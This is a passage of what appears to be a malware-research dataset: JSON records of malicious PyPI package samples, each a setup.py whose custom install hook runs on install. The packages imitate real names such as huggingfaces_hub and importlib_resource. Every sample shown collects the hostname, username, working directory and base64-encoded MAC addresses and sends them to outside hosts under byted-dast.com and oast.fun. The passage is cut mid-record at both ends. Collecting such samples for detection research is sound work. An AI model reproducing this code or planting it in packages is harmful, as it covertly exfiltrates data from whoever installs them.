        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"huggingfaces_hub\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-imageoi-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"imageoi\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-importlib-resource-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"importlib_resource\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-importlibs-resource-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"importlibs_resource\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-fantasia3d-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"fantasia3d\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-image-dream-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Image_Dream\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-imagedreamfusion-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"imagedreamfusion\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-instructnerf2nerf-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"instructnerf2nerf\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-latentnerf-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"latentnerf\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-magic3d-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"magic3d\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-prolificdreamer-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"prolificdreamer\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-sampling-util-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"sampling_util\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-sjc-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params 